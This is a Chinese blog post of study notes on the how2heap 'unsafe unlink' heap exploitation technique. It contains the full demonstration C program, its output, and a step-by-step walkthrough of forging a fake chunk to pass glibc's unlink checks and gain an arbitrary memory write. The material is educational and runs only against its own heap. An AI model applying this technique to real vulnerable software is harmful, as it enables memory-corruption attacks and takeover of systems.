---
title: how2heap-04 unsafe unlink实践笔记
time: 2017-08-09
tags: [CTF, pwn, heap]
layout: post
categories: posts
---

> 本文是对shellphish的[how2heap](https://github.com/shellphish/how2heap)系列堆漏洞课程的实践笔记

# 示例代码

``` c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>


uint64_t *chunk0_ptr;

int main()
{
	printf("Welcome to unsafe unlink 2.0!\n");
	printf("Tested in Ubuntu 14.04/16.04 64bit.\n");
	printf("This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n");
	printf("The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n");

	int malloc_size = 0x80; //we want to be big enough not to use fastbins
	int header_size = 2;
	/* [1] */
	printf("The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n");

	chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0
	uint64_t *chunk1_ptr  = (uint64_t*) malloc(malloc_size); //chunk1
	printf("The global chunk0_ptr is at %p, pointing to %p\n", &chunk0_ptr, chunk0_ptr);
	printf("The victim chunk we are going to corrupt is at %p\n\n", chunk1_ptr);
	/* [2] */
	printf("We create a fake chunk inside chunk0.\n");
	printf("We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &chunk0_ptr so that P->fd->bk = P.\n");
	chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);

	printf("We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &chunk0_ptr so that P->bk->fd = P.\n");
	printf("With this setup we can pass this check: (P->fd->bk != P || P->bk->fd != P) == False\n");
	chunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2);

	printf("Fake chunk fd: %p\n",(void*) chunk0_ptr[2]);
	printf("Fake chunk bk: %p\n\n",(void*) chunk0_ptr[3]);
	/* [3] */

	printf("We need to make sure the 'size' of our fake chunk matches the 'previous_size' of the next chunk (fd->prev_size)\n");
	printf("With this setup we can pass this check: (chunksize(P) != prev_size (next_chunk(P)) == False\n");
	chunk0_ptr[1] = chunk0_ptr[-3];
	printf("Therefore, we set the 'size' of our fake chunk to the value of chunk0_ptr[-3]: 0x%08lx\n", chunk0_ptr[1]);
	printf("You can find the commitdiff of this check at https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30\n\n");
	/* [4] */

	printf("We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n");
	uint64_t *chunk1_hdr = chunk1_ptr - header_size;
	printf("We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n");

	printf("It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n");
	chunk1_hdr[0] = malloc_size;
	printf("If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n",(void*)chunk1_hdr[0]);

	printf("We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.\n\n");
	chunk1_hdr[1] &= ~1;
	/* [5] */

	printf("Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n");
	printf("You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n");
	free(chunk1_ptr);


	printf("At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n");
	char victim_string[8];
	strcpy(victim_string,"Hello!~");
	chunk0_ptr[3] = (uint64_t) victim_string;

	printf("chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n");
	printf("Original value: %s\n",victim_string);
	chunk0_ptr[0] = 0x4141414142424242LL;
	printf("New Value: %s\n",victim_string);
	/* [6] */
}
```

本节示例的漏洞程序可以从此处下载： [unsafe_unlink](/files/how2heap/unsafe_unlink)

# 样例输出

```
Welcome to unsafe unlink 2.0!
Tested in Ubuntu 14.04/16.04 64bit.
This technique can be used when you have a pointer at a known location to a region you can call unlink on.
The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.
The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.

The global chunk0_ptr is at 0x602068, pointing to 0x603010
The victim chunk we are going to corrupt is at 0x6030a0

We create a fake chunk inside chunk0.
We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &chunk0_ptr so that P->fd->bk = P.
We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &chunk0_ptr so that P->bk->fd = P.
With this setup we can pass this check: (P->fd->bk != P || P->bk->fd != P) == False
Fake chunk fd: 0x602050
Fake chunk bk: 0x602058

We need to make sure the 'size' of our fake chunk matches the 'previous_size' of the next chunk (fd->prev_size)
With this setup we can pass this check: (chunksize(P) != prev_size (next_chunk(P)) == False
Therefore, we set the 'size' of our fake chunk to the value of chunk0_ptr[-3]: 0x00000000
You can find the commitdiff of this check athttps://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30

We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.
We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.
It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly
If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: 0x80
We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.

Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.
You can find the source of the unlink macro at[](https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344)

At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.
chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.
Original value: Hello!~
New Value: BBBBAAAA
```

本节示例的漏洞程序可以从此处下载: [unsafe_unlink](/files/how2heap/unsafe_unlink)


# 漏洞分析

这节我们学习`unsafe unlink`，即不安全的unlink解链操作。当我们得到了一个可以进行unlink操作的地址指针的话，就可以使用这项技术。最常见的利用情景就是我们有一个可以溢出的漏洞函数同时拥有一个全局指针时。

而本次示例的重点在于如何使用`free()`破坏全局指针来实现任意地址读写

## [1] 定义malloc_size和header_size

程序定义了malloc_size为0x80，尽量地大以避免使用`fastbins`，而后定义了header_size为2

## [2] malloc申请两块空间

malloc申请了两块空间，分别为`chunk0`和`chunk1`并用`chunk0_ptr`和`chunk1_ptr`指向其，我们可以看到，`chunk0_ptr`这个指针所在的地址(全局指针变量存储在bss段上)为`0x602068`，指向`0x603010`(指向分配的堆地址)，而`chunk1_ptr`指向`0x6030a0`(堆地址)，两个chunk之间的距离是`0x90 = 0x80 + 0x10`，这多出的`0x10`是chunk的头信息，对于`Allocated chunk`，头信息只有`prev_size`和`size`两项。

这里我们可以这样认为，`*chunk_ptr`为变量`chunk_ptr`所指向的堆地址的值，而`chunk_ptr`则代表该指针指向的堆地址，而`&chunk_ptr`为指针`chunk_ptr`存储在栈上(或bss段上，取决于指针是否为全局指针变量)的地址。

``` c
The global chunk0_ptr is at 0x602068, pointing to 0x603010
The victim chunk we are going to corrupt is at 0x6030a0
```

## [3] 构造fake chunk

如果明白了`*chunk0_ptr`，`chunk0_ptr`和`&chunk0_ptr`之间的关系的话，这里我们也可以很清楚的看明白是个什么操作

[3]主要是在堆块`chunk0`的`data`区构造一个`fake chunk`，暂且称为`P`吧，并且将这个`fake chunk`的`fake fd`和`fake bk`指向指针`chunk0_ptr`附近，意思就是`P->fd->bk = P`以及`P->bk->fd = P`.

``` c
//The global chunk0_ptr is at 0x602068
Fake chunk fd: 0x602050
Fake chunk bk: 0x602058
```

这样我们就通过了检查`(P->fd->bk != P || P->bk->fd != P) == False\n")`

## [4] 构造fake chunk的size与next chunk的prev_size相等

为了通过检查`(chunksize(P) != prev_size (next_chunk(P)) == False`，我们需要将我们伪造的chunk `P`的下一个chunk的`prev_size`位设置为`chunk P`的`size`，这样就能通过检查

``` c
chunk0_ptr[1] = chunk0_ptr[-3];
Therefore, we set the 'size' of our fake chunk to the value of chunk0_ptr[-3]: 0x00000000
```

这样我们`fake chunk`的`size`就等于`next chunk`的`prev_size`，虽然是`0x00000000`，但是没关系，我们只需要满足两者相等就可以了。

## [5] 修改next chunk的prev_size和P位

这里的`chunk1_hdr`位于`chunk1_ptr`所指向的堆地址，再上去`2`个长度，也就是`chunk1_ptr`指向`chunk1`的数据区，而`chunk1_hdr`指向`chunk1`的`metadata`起始处，也就是中间是`prev_size`和`size`，也就是`header_size=2`

我们这里因为在`chunk0`的数据区构造了一个`fake chunk`，而我们需要误导glibc,让它以为`chunk1`的上一个`chunk`是`fake chunk`，那么我们就需要改变`prev_size`，让他变小，比如原先是`0x90 + chunk1_address = chunk0_address`，那么我们现在`0x80 + chunk1_address = fake_chunk_address`。同时我们需要将`chunk1`的`P`(prev_inuse)为设置为0，也就是设定`fake chunk`是处于`freed`的状态。因为只有被释放的`chunk`，它的`metadata`才有`fd`和`bk`。

``` c
uint64_t *chunk1_hdr = chunk1_ptr - header_size;
chunk1_hdr[0] = malloc_size;
chunk1_hdr[1] &= ~1;
```

## [6] unsafe unlink后获得写能力

在free掉chunk1后，触发unsafe unlink，这时chunk0_ptr[0]和chunk0_ptr[3]实际上指向同一个地址，因此当修改chunk0_ptr[3]时实际上也是修改chunk0_ptr[0].


![unsafe_unlink](/images/how2heap/unsafe_unlink.png)
